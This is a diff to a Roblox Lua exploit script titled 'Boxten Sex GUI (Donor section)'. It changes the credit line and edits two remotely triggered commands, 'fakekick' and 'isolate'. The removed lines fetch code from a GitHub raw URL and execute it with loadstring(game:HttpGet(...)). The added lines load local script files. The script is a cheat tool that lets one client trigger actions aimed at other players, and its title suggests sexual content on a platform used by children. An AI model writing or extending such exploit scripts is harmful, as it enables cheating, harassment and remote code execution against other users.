@@ -4,9 +4,9 @@
  \ \ \-.  \  \ \ \/\ \  \/_/\_\/_  \ \ \  \ \ \/\ \  \ \ \_\ \  \ \___  \  
   \ \_\\"\_\  \ \_____\   /\_\/\_\  \ \_\  \ \_____\  \ \_____\  \/\_____\ 
    \/_/ \/_/   \/_____/   \/_/\/_/   \/_/   \/_____/   \/_____/   \/_____/
-
-   Made by unable | Boxten Sex GUI (Donor section)
-
+   
+   Made by Team Noxious -- Boxten Sex GUI [Donor section]
+   
 ---------------------------------------------------------------------------------------------------------------------------]]--
 
 local version = 2
@@ -1074,7 +1074,7 @@ env.stuf.handshaker.addcmd("fakekick", function(sender)
 	if env.stuf.handshaker.excludeself and sender == env.stuf.plr then return end
 
 	env.funcs.box(sender.Name .. " called fakekick")
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ineptpractices/.../refs/heads/main/-/-."))()
+	env.funcs.recursivels("book%201/%CA%95f/%CA%94fk.lua", true)
 end)
 
 -------------------------------------------------------------------------------------------------------------------------------
@@ -1088,7 +1088,7 @@ env.stuf.handshaker.addcmd("isolate", function(sender)
 	if env.stuf.handshaker.excludeself and sender == env.stuf.plr then return end
 
 	env.funcs.box(sender.Name .. " called isolate")
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ineptpractices/.../refs/heads/main/-/-.."))()
+	env.funcs.recursivels("book%201/%CA%95f/%CA%94br.lua", true)
 end)
 
 -------------------------------------------------------------------------------------------------------------------------------
